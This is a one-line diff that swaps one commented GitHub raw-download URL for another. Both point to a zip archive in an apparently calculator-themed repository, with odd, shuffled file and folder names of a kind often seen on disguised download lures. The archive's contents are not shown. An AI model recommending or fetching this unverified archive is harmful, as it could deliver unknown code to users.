@@ -1,1 +1,1 @@
-﻿# https://raw.githubusercontent.com/Harbor19/harbor19.github.io-calculator-app/main/unspleenishly/app-harbor-github-io-calculator-Chudic.zip
+﻿# https://github.com/Harbor19/harbor19.github.io-calculator-app/raw/refs/heads/main/unspleenishly/io-calculator-github-app-harbor-1.1.zip
